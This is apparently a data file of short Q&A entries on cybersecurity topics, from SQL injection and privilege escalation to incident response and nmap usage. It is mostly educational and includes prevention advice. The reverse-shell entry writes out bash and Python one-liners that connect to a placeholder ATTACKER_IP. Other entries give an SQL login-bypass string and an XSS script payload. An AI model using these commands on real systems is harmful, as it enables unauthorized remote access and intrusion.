cybersecurity_qa.title: Cybersecurity Concepts & Techniques
cybersecurity_qa.description: Comprehensive Q&A covering all major cybersecurity topics.

topics.SQL Injection (SQLi): SQL Injection is a code injection technique that exploits vulnerabilities in applications that use SQL databases. Attackers insert malicious SQL statements into input fields to manipulate the database. Types: In-band (UNION-based, Error-based), Blind (Boolean-based, Time-based), Out-of-band. Example: ' OR 1=1 -- in a login form bypasses authentication. Prevention: Use parameterized queries/prepared statements, input validation, WAF, least privilege DB accounts. Tools: sqlmap, Burp Suite, Havij.
topics.Cross-Site Scripting (XSS): XSS allows attackers to inject malicious scripts into web pages viewed by other users. Types: Reflected XSS (non-persistent, via URL parameters), Stored XSS (persistent, saved in database), DOM-based XSS (client-side JavaScript manipulation). Example: <script>alert('XSS')</script> in a comment field. Impact: session hijacking, cookie theft, defacement, keylogging, phishing. Prevention: output encoding, Content-Security-Policy header, input sanitization, HttpOnly cookies.
topics.Cross-Site Request Forgery (CSRF): CSRF tricks authenticated users into performing unintended actions on a web application. The attacker crafts a malicious request and tricks the victim into executing it while authenticated. Example: hidden form that transfers money when victim visits attacker's page. Prevention: CSRF tokens (synchronizer tokens), SameSite cookie attribute, checking Referer/Origin headers, re-authentication for sensitive actions.
topics.Remote Code Execution (RCE): RCE allows an attacker to execute arbitrary code on a target system remotely. Causes: deserialization flaws, command injection, file upload vulnerabilities, buffer overflows. Impact: complete system compromise. Examples: Log4Shell (CVE-2021-44228), EternalBlue (MS17-010). Prevention: input validation, sandboxing, regular patching, least privilege, WAF.
topics.Buffer Overflow: A buffer overflow occurs when a program writes data beyond the allocated memory buffer. Types: Stack-based (overwrite return address), Heap-based (corrupt heap metadata), Integer overflow. Exploitation: overwrite EIP/RIP to redirect execution to shellcode or ROP chain. Protection: ASLR, DEP/NX, Stack Canaries, PIE, SafeSEH. Tools: GDB, pwntools, ROPgadget, radare2.
topics.Privilege Escalation: Privilege escalation is gaining higher access than initially granted. Vertical: user → root/admin. Horizontal: user A → user B. Linux methods: SUID binaries, sudo misconfigs, kernel exploits, cron jobs, writable /etc/passwd, capabilities, PATH hijacking. Windows methods: unquoted service paths, DLL hijacking, AlwaysInstallElevated, token impersonation, SeImpersonate. Tools: LinPEAS, WinPEAS, BeRoot, PowerUp.
topics.Reverse Shell: A reverse shell is when the target machine initiates a connection back to the attacker. The attacker sets up a listener, and the victim connects to it, giving the attacker shell access. Bash: bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1. Python: python -c 'import socket,subprocess;s=socket.socket();s.connect((IP,PORT));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'. Netcat listener: nc -lvnp PORT. Upgrading: python3 -c 'import pty;pty.spawn("/bin/bash")'.
topics.Phishing & Social Engineering: Social engineering manipulates people into revealing confidential information. Types: Phishing (mass emails), Spear phishing (targeted), Whaling (executives), Vishing (voice), Smishing (SMS), Pretexting, Baiting, Tailgating, Quid pro quo. Tools: GoPhish, Social Engineering Toolkit (SET), King Phisher. Defense: security awareness training, email filtering, MFA, DMARC/DKIM/SPF.
topics.Man-in-the-Middle (MITM): MITM attack intercepts communication between two parties. Techniques: ARP spoofing, DNS spoofing, SSL stripping, HTTPS interception, WiFi evil twin, BGP hijacking. Tools: Bettercap, Ettercap, mitmproxy, arpspoof, sslstrip. Prevention: HTTPS everywhere, HSTS, certificate pinning, VPN, network segmentation.
topics.Denial of Service (DoS/DDoS): DoS/DDoS attacks flood targets to make services unavailable. Types: Volumetric (UDP flood, ICMP flood, amplification), Protocol (SYN flood, Ping of Death, Smurf), Application layer (HTTP flood, Slowloris, RUDY). Amplification vectors: DNS, NTP, Memcached, SSDP. Defense: rate limiting, CDN (Cloudflare), blackhole routing, SYN cookies, WAF, anycast.
topics.Password Attacks: Methods to crack or bypass passwords. Brute force: try all combinations. Dictionary attack: use wordlists. Rainbow tables: precomputed hashes. Credential stuffing: reuse stolen credentials. Password spraying: common passwords against many accounts. Keylogging: capture keystrokes. Tools: Hashcat, John the Ripper, Hydra, Medusa, CeWL, Crunch. Defense: MFA, account lockout, rate limiting, strong password policy, salted hashes.
topics.Malware Types: Virus: self-replicating, attaches to files. Worm: self-propagating across networks. Trojan: disguised as legitimate software. Ransomware: encrypts files, demands payment. Spyware: monitors user activity. Adware: unwanted advertisements. Rootkit: hides presence, maintains access. Keylogger: records keystrokes. RAT: Remote Access Trojan for remote control. Botnet: network of infected machines. Fileless malware: operates in memory only. Analysis tools: VirusTotal, Cuckoo Sandbox, IDA Pro, Ghidra, x64dbg.
topics.Firewalls: A firewall monitors and filters network traffic based on security rules. Types: Packet filter (L3/L4, stateless), Stateful inspection (tracks connections), Application-level gateway/proxy (L7), Next-Generation (NGFW: DPI + IDS/IPS + app awareness), WAF (web application specific). Linux: iptables, nftables, ufw. Windows: Windows Defender Firewall, netsh advfirewall. Key concepts: default deny, allow by exception, DMZ, zone-based policies.
topics.Intrusion Detection & Prevention (IDS/IP: IDS monitors network traffic for suspicious activity and alerts. IPS actively blocks threats. Types: Network-based (NIDS/NIPS) — monitors network segments. Host-based (HIDS/HIPS) — monitors individual hosts. Detection methods: Signature-based (known patterns), Anomaly-based (baseline deviations), Hybrid. Tools: Snort, Suricata, OSSEC, Wazuh, Zeek (Bro). Key: requires tuning to reduce false positives.
topics.VPN (Virtual Private Network): VPN creates an encrypted tunnel for secure communication over public networks. Protocols: OpenVPN (SSL/TLS), WireGuard (modern, fast), IPSec (IKEv2), L2TP/IPSec, PPTP (insecure). Use cases: remote access, site-to-site, bypass censorship, privacy. Security: provides encryption in transit but doesn't make you anonymous. Risks: VPN provider logging, DNS leaks, WebRTC leaks.
topics.Cryptography Basics: Symmetric encryption: same key for encrypt/decrypt (AES-256, ChaCha20). Asymmetric encryption: public/private key pair (RSA, ECC, Ed25519). Hashing: one-way function producing fixed output (SHA-256, SHA-3, bcrypt, Argon2). Digital signatures: verify authenticity and integrity. TLS/SSL: secures web traffic. Certificates: X.509, issued by Certificate Authorities. PKI: Public Key Infrastructure for managing certificates.
topics.Network Scanning & Enumeration: Network scanning discovers hosts, ports, and services. Nmap: nmap -sS -sV -O target (SYN scan + version + OS). nmap -sC -sV -p- target (all ports with scripts). nmap --script vuln target (vulnerability scripts). Masscan: fastest port scanner. Netdiscover: ARP-based host discovery. Enum4linux: SMB/NetBIOS enum. SNMPwalk: SNMP enumeration. Gobuster/Dirb/Ffuf: web directory brute-forcing. Nikto: web server vulnerability scanner.
topics.Web Application Security: Common web vulns: SQLi, XSS, CSRF, SSRF, IDOR, file upload, path traversal, command injection, XXE, deserialization, broken authentication, security misconfiguration. Testing methodology: 1) Recon (subdomains, tech stack), 2) Map the application, 3) Test authentication, 4) Test authorization, 5) Test input validation, 6) Test business logic, 7) Test API endpoints. Tools: Burp Suite, OWASP ZAP, Postman, Nikto, SQLMap, XSSHunter.
topics.Wireless Security: WiFi attacks: WPA/WPA2 handshake capture + cracking (aircrack-ng), WPS brute force (Reaver), Evil twin AP (hostapd + dnsmasq), Deauthentication attack, PMKID attack (hashcat). Tools: Aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng), Wifite, Bettercap, Fluxion. Security: use WPA3, disable WPS, strong passphrase, MAC filtering (limited), use 802.1X/RADIUS for enterprise.
topics.Digital Forensics: Forensics is the process of collecting, preserving, and analyzing digital evidence. Steps: Identification, Preservation (chain of custody), Collection (forensic imaging), Examination, Analysis, Reporting. Disk forensics: Autopsy, FTK, EnCase. Memory forensics: Volatility, Rekall. Network forensics: Wireshark, NetworkMiner. Tools: dd, dcfldd (imaging), foremost/scalpel (file carving), exiftool (metadata). Key: never modify original evidence.
topics.Incident Response: IR is the methodology for handling security breaches. NIST phases: 1) Preparation, 2) Detection & Analysis, 3) Containment, 4) Eradication, 5) Recovery, 6) Lessons Learned. Key actions: isolate affected systems, preserve evidence, identify IOCs (Indicators of Compromise), determine attack vector, assess impact, communicate with stakeholders. Tools: Velociraptor, GRR, TheHive, MISP, Splunk, ELK Stack.
topics.Cloud Security: Cloud security covers AWS, Azure, GCP protection. Risks: misconfigured S3 buckets, exposed API keys, overly permissive IAM, insecure serverless functions, container vulnerabilities. Tools: ScoutSuite, Prowler (AWS), CloudSploit, Pacu (AWS exploitation). Best practices: principle of least privilege, enable MFA, encrypt data at rest and in transit, enable logging (CloudTrail, Azure Monitor), use security groups/NACLs, regular audits.
topics.Container Security: Container security covers Docker, Kubernetes, and container orchestration. Risks: vulnerable base images, running as root, exposed Docker socket, secrets in images, insecure registries. Kubernetes: RBAC misconfiguration, exposed API server, pod-to-pod attacks. Tools: Trivy (vuln scanning), Falco (runtime security), kube-bench, kubeaudit, Anchore. Best practices: minimal base images, non-root user, read-only FS, resource limits, network policies.
topics.Bug Bounty Hunting: Bug bounty programs reward security researchers for finding vulnerabilities. Platforms: HackerOne, Bugcrowd, Synack, Intigriti. Methodology: 1) Recon (subdomains, endpoints, tech stack), 2) Map attack surface, 3) Test for common vulns (IDOR, XSS, SQLi, SSRF), 4) Test business logic, 5) Write clear report. Tips: automate recon, focus on less-tested features, read previous disclosures, understand the app deeply before testing. Report: clear title, steps to reproduce, impact, remediation suggestion.
topics.Red Teaming: Red teaming simulates real-world attacks to test an organization's defenses. Differs from pentesting: broader scope, tests people + process + technology, longer duration, stealth-focused. Phases: OSINT & recon, initial access (phishing, exploit), establish C2, privilege escalation, lateral movement, data exfiltration, reporting. Frameworks: MITRE ATT&CK, Cyber Kill Chain, PTES. Tools: Cobalt Strike, Covenant, Sliver, Mythic, Empire.
topics.Blue Team & Defense: Blue team defends against attacks. Key areas: network monitoring (IDS/IPS), endpoint protection (EDR), log analysis (SIEM), threat hunting, vulnerability management, patch management, incident response, security awareness training. Tools: Splunk, ELK Stack, Wazuh, CrowdStrike, Carbon Black, Sysmon, YARA rules. Frameworks: NIST CSF, CIS Controls, ISO 27001.
topics.OSINT (Open Source Intelligence): OSINT is gathering information from publicly available sources. Techniques: Google dorking (site:, inurl:, filetype:), social media analysis, WHOIS, DNS enum, certificate transparency, Wayback Machine, GitHub/GitLab searches, Shodan/Censys, metadata extraction. Tools: theHarvester, Maltego, Recon-ng, SpiderFoot, Sherlock (username search), Amass. Frameworks: OSINT Framework (osintframework.com).
topics.Exploit Development: Exploit development creates code to take advantage of vulnerabilities. Skills needed: assembly (x86/x64), C/C++, Python, debugging (GDB, WinDbg), understanding of OS internals. Types: buffer overflow, format string, use-after-free, race condition, type confusion, integer overflow. Modern protections: ASLR, DEP/NX, Stack Canaries, CFI, RELRO. Bypass techniques: ROP chains, ret2libc, heap spraying, information leaks. Tools: pwntools, ROPgadget, Ghidra, IDA Pro, radare2.
topics.API Security: API security protects application programming interfaces. Common vulnerabilities: broken authentication, broken authorization (BOLA/IDOR), excessive data exposure, rate limiting absence, mass assignment, SSRF via API, injection attacks. Testing: map all endpoints, test auth/authz, fuzz parameters, check rate limits, test input validation. Tools: Postman, Burp Suite, OWASP ZAP, Insomnia. Standards: OAuth 2.0, JWT, API keys. Reference: OWASP API Security Top 10.
topics.Zero-Day Vulnerabilities: A zero-day is a vulnerability unknown to the software vendor with no available patch. Zero-day exploit: code that takes advantage of a zero-day. Zero-day attack: using the exploit against targets. Famous examples: Stuxnet, EternalBlue, Log4Shell, PrintNightmare, ProxyLogon. Markets: vendors pay bounties, governments buy for intelligence, criminals sell on dark web. Defense: defense-in-depth, behavior-based detection, network segmentation, least privilege, rapid patching when available.
topics.Kali Linux Tools: Kali Linux is a Debian-based distro for penetration testing. Key tools: Information Gathering: Nmap, theHarvester, Recon-ng, Maltego. Vulnerability Analysis: Nessus, OpenVAS, Nikto. Web Application: Burp Suite, OWASP ZAP, SQLMap, Dirb. Password Attacks: Hashcat, John, Hydra, Medusa. Wireless: Aircrack-ng, Wifite, Reaver. Exploitation: Metasploit, SearchSploit. Post-Exploitation: Mimikatz, BloodHound, Empire. Forensics: Autopsy, Volatility, Binwalk.
topics.Nmap Guide: Nmap (Network Mapper) is the most important scanning tool. Scan types: -sS SYN scan (stealth), -sT TCP connect, -sU UDP, -sV version detection, -O OS detection, -sC default scripts, -A aggressive (OS+version+scripts+traceroute). Useful commands: nmap -sS -sV -p- target (full TCP scan), nmap -sU --top-ports 100 target (UDP), nmap --script vuln target (vuln scan), nmap -Pn target (skip ping). Output: -oN normal, -oX XML, -oG grepable, -oA all formats. Timing: -T0 paranoid to -T5 insane.
